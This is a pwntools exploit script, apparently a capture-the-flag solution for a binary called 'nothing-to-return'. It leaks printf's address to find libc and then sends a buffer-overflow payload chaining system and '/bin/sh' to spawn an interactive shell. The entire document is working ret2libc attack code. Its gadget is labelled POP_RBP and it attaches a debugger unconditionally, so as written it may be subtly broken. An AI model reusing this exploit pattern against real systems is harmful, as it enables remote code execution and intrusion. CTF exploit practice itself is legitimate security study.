#!/usr/bin/env python3

from pwn import *

exe = ELF("./nothing-to-return_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    gdb.attach(
        r,
        """
    b *(main+67)
""",
    )

    printf_addr = r.recvline().strip().split()[-1]
    printf_addr = int(printf_addr, 16)
    libc.address = printf_addr - libc.symbols["printf"]
    log.info("libc base: {}".format(hex(libc.address)))

    POP_RBP = 0x000000000040117D

    payload = b"A" * 64
    payload += p64(POP_RBP)
    payload += p64(libc.symbols["system"])
    payload += p64(next(libc.search(b"/bin/sh")))

    r.recvuntil(b"size:")
    r.sendline(b"100")
    r.recvuntil(b"input:")
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
